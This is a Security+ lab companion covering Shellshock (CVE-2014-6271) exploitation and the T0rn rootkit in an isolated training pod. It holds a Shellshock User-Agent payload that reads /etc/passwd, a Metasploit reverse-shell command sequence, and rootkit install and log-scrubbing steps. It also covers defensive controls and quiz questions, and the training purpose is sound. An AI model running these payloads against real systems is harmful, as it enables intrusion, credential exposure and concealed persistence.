Security+ Lab Companion · Lab 02

Analyzing Types of Malware & Application Attacks

Two malware stories in one lab: a web request that tricks Bash into running commands (Shellshock), and what an attacker does after they're in — hiding with a rootkit. The thread running through both is indicators of compromise, and why finding malware is not the same as stopping it.

📋 Overview

Two classic malware stories, and the single idea they share.

Shellshock (CVE-2014-6271) is a flaw in how Bash parses environment variables: text after a crafted function definition gets executed. The lab delivers it the way it was exploited in the wild — through a web server's CGI, by hiding commands in the HTTP User-Agent header. The T0rn rootkit is the second act: what an attacker does once inside, replacing system binaries (so ls lies to you) and hiding in secret directories, and how rkhunter catches it.

[THE ONE IDEA] Watch the seam between the two halves: the exploit gets in, the rootkit stays in. Detecting the rootkit afterward (rkhunter) is not the same as preventing it — that gap is the whole point.

One setup step is worth noting: the lab has you disable a pfSense rule to reach the target from Kali. That's a pod convenience, and a reminder that the exploit still needs a network path — closing that path is itself a control.

🧭 The walkthrough

Every command, what it does, and the options that matter. The 📸 markers are your evidence moments.

Phase 1 · Identify Shellshock

Trigger the bug through a web header

Stand up the vulnerable service

sysadmin@seconion:~$ sudo docker run --rm -it -p 4444:80 vulnerables/cve-2014-6271

A container running the exact 2014-era vulnerable Bash/CGI, published on port 4444. (The lab then has you disable the pfSense WAN rule "Block Internal network access" only so Kali can reach it in the pod.)

Smuggle commands in the User-Agent

Browse to 192.168.0.6:4444/cgi-bin/vulnerable, open the Firefox Tamper Data add-on, and replace the User-Agent header with the magic string:

() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'

() { :; }; is an empty Bash function definition; everything after it is what Bash wasn't supposed to run. Because CGI copies request headers into environment variables, the server's Bash parses your header and executes cat /etc/passwd. If the password file prints back, you've proven arbitrary command execution from a header.

📸Screenshot for your report: the server returning /etc/passwd contents via the crafted User-Agent.
Phase 2 · Exploit with Metasploit

Turn the bug into a shell

Load the Shellshock module

kali@kali$ msfconsole msf6> search shellshock msf6> use exploit/multi/http/apache_mod_cgi_bash_env_exec msf6> set RHOSTS 192.168.0.6 msf6> set RPORT 4444 msf6> set TARGETURI /cgi-bin/vulnerable msf6> set payload linux/x64/shell_reverse_tcp msf6> exploit

RHOSTS/RPORT are the victim; TARGETURI is the vulnerable CGI path. The payload must be linux/x64 to match the target — the same payload-matching idea as Lab 01. After exploit, run whoami and pwd in the shell.

📸Screenshot for your report: the Metasploit session with whoami/pwd confirming code execution on 192.168.0.6.
Phase 3 · The rootkit

Install T0rn and watch it hide

kali@kali$ tar zxvf tk.tgz # unpack the toolkit kali@kali$ cd tk ; cat tornkit-README kali@kali$ sudo ./t0rn vuln 4444 # installs the backdoor; listens on 4444

Right after install, ls stops working — the rootkit replaced it with a trojaned version that hides the attacker's files. Its secret directories live at /usr/src/.puta and /usr/info/.t0rn, and ./t0rnsb root scrubs matching lines out of the system logs to cover tracks.

Phase 4 · Detect

Find what's hiding

kali@kali$ rkhunter -h kali@kali$ sudo rkhunter --check

rkhunter compares system binaries and known rootkit fingerprints against a baseline and flags what the rootkit changed — the trojaned binaries and hidden files light up as warnings.

📸Screenshot for your report: the rkhunter --check output flagging the rootkit / warning lines.

⚠️ Where students get stuck

The handful of places this lab stalls.

[DOCKER DROPS TO BASH] If the vulnerable container exits back to a prompt, restart the SecOnion VM and run the docker run command again.
[TAMPER DATA IS SLOW] The add-on can take a minute to load, and you must edit the exact User-Agent field. The payload must be typed exactly, including () { :; }; with its spaces.
[WRONG PAYLOAD] The target is 64-bit Linux — set linux/x64/shell_reverse_tcp. The module's default won't match and the shell won't open.
[LS IS "BROKEN"] After the rootkit installs, ls failing is the demonstration, not an error. Navigate with full paths to the hidden directories.
[THE FIREWALL RULE] You disabled "Block Internal network access" to reach the target. That's safe only in this isolated pod — in the real world it exposes the intranet to the internet.

🛡️ The defender's view

Run both attacks backwards: each step is a control that was missing.

Patch management

Breaks: Shellshock (Phase 1–2)

CVE-2014-6271 was fixed in 2014. A patched Bash simply ignores the trailing commands. Exploiting a decade-old known CVE is a patch-hygiene failure above all else.

WAF / input validation

Breaks: the CGI delivery

A web application firewall inspecting request headers blocks the () { :; }; signature before it ever reaches Bash.

Network / host IDS

Breaks: detection

SecOnion's Suricata/Zeek sensors alert on the Shellshock signature and on the unexpected reverse shell leaving the server.

File integrity monitoring

Breaks: the rootkit (Phase 3)

Trojaned ls and new hidden binaries change known-good hashes. rkhunter, AIDE, or Tripwire flag the tampering.

Least privilege + egress filtering

Breaks: the shell & the damage

CGI shouldn't run as an account that can drop a rootkit, and outbound filtering stops the reverse shell from phoning home.

Don't weaken the perimeter

Breaks: reachability

The disabled firewall rule is the lesson in the negative: exposing internal services to the WAN is what let the exploit land at all.

[DEFENSE IN DEPTH] Patching alone would have stopped this one — but notice how many independent controls each break a different link. That redundancy is the Security+ answer.

⚡ Cheat sheet

The whole lab on one screen.

Exploit → persist

  • User-Agent: () { :; }; … /bin/bash -c '…'
  • use exploit/multi/http/apache_mod_cgi_bash_env_exec
  • set RHOSTS / RPORT / TARGETURI → set payload linux/x64/shell_reverse_tcp → exploit
  • sudo ./t0rn vuln 4444 → hides in /usr/src/.puta, /usr/info/.t0rn
  • sudo rkhunter --check to detect

What stops it

  • Patch Bash (the real fix)
  • WAF / header validation
  • IDS signatures (Shellshock, reverse shell)
  • File integrity monitoring
  • Least privilege + egress filtering

Know the terms

  • Shellshock — Bash env-var command injection
  • Rootkit — malware that hides itself by altering the OS
  • IoC — indicator of compromise
  • Trojaned binary — a replaced system tool that lies

✅ Check yourself

1. How does Shellshock run commands through a plain web request?

A bug in Bash's handling of environment variables: a crafted value like () { :; }; <commands> makes Bash execute the trailing commands. CGI copies HTTP headers (e.g. User-Agent) into environment variables, so a header becomes the attack vector.

2. After the rootkit installs, ls misbehaves. Why, and what should a defender conclude?

The rootkit replaced ls (and other binaries) with trojaned versions that hide its files. Unexpected behavior from core tools is a classic indicator of compromise — verify against known-good file hashes rather than trusting the tool.

3. What single control would have prevented this exploit entirely?

Patching. CVE-2014-6271 has had a fix since 2014; current Bash is not vulnerable, so patch management closes the door completely.

4. rkhunter found the rootkit. Is that prevention or detection, and why does the distinction matter?

Detection — it found the rootkit after it was installed but did nothing to stop the installation. You still need preventive controls (patching, least privilege, allow-listing) in front of it.
